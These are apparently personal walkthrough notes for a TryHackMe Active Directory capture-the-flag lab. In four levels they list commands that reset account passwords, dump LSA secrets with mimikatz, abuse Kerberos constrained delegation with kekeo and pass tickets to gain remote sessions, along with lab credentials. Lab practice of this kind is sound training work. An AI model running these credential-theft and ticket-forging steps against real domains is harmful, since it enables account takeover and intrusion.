Takeover AD
---------------

```

Level 1:
ssh za.tryhackme.loc\\barbara.reid@thmwrk1.za.tryhackme.loc   (Password1)
powershell
    PS C:> Add-ADGroupMember "IT Support" -Members "barbara.reid"
    PS C:> Get-ADGroupMember -Identity "Tier 1 Admins" (try Tier 1)
	PS C:> $Password = ConvertTo-SecureString "d4b0mb12345!" -AsPlainText -Force
	PS C:> Set-ADAccountPassword -Identity "t1_trevor.jones" -Reset -NewPassword $Password
	     or
	PS C:> Set-ADAccountPassword -Identity "t2_kathleen.mills" -Reset -NewPassword $Password
If access is denied then logout, wait 5 mins and log back in again and try this again.
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:t2_kathleen.mills /p:d4b0mb12345! /nocert

Level2:
ssh za.tryhackme.loc\\t2_kathleen.mills@thmwrk1.za.tryhackme.loc   (d4b0mb12345!)
C:\Tools\mimikatz_trunk\x64\mikikatz.exe
	mikikatz # token::elevate
	mimikatz # lsadump::secrets
	mimikatz # exit
C:\Tools\kekeo\x64>kekeo.exe
	kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
	kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
	kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
	exit
C:\Tools\mimikatz_trunk\x64\mikikatz.exe
	privilege::debug
	mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
	mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
	mikikatz # exit
powershell
	PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc
	PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc

Level3:
ssh za.tryhackme.loc\\t1_trevor.jones@thmwrk1.za.tryhackme.loc
powershell
	PS C:> $Password = ConvertTo-SecureString "d4b0mb12345!" -AsPlainText -Force
	PS C:> Set-ADAccountPassword -Identity "t1_trevor.jones" -Reset -NewPassword $Password
	PS C:> Get-ADGroupMember -Identity "IT Support"

Level4:
ssh za.tryhackme.loc\\Administrator@thmdc.za.tryhackme.loc   (tryhackmewouldnotguess1@)

```
